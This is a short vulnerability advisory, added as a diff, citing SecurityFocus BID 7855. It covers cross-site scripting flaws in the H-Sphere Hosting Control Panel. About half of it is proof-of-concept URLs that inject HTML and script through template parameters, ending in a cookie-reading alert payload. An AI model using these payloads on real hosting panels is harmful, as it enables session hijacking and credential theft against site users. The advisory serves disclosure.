@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/7855/info
+
+H-Sphere is prone to multiple cross-site scripting vulnerabilities via the HTML template feature in the Hosting Control Panel. HTML and script code will not be filtered from pages which are generated when a request for an invalid or unknown template is made.
+
+This could be exploited if a web user follows a malicious link to a site hosting the vulnerable software that includes hostile HTML or script code. The link may also need to contain the username of a valid, logged in user.
+
+http://www.example.com/[PATH TO
+H-SPHERE]/servlet/psoft.hsphere.CP?action=login&ftemplate=[MORE CODE AND
+XSS]&requestURL="><h1>XSS%20in%20PSOFT%20SPHERE<a%20href="&login=[USERNAME]&
+password=[PASSWORD]
+
+http://www.example.com/[PATH TO
+H-SPHERE]/servlet/psoft.hsphere.CP/[USERNAME]/[ID]/psoft.hsphere.CP?template
+_name=<H1>xss</H1>
+
+http://www.example.com/[PATH TO
+H-SPHERE]/servlet/psoft.hsphere.CP/[USERNAME]/[ID]/psoft.hsphere.CP?template
+_name=<IFRAME>
+
+http://www.example.com/[PATH TO
+H-SPHERE]/servlet/psoft.hsphere.CP/[USERNAME]/[ID]/psoft.hsphere.CP?template
+_name=<h1>XSS
+
+http://www.example.com/[PATH TO
+H-SPHERE]/servlet/psoft.hsphere.CP/[USERNAME]/[ID]/psoft.hsphere.CP?template
+_name=<script>alert(document.cookie);</script> 
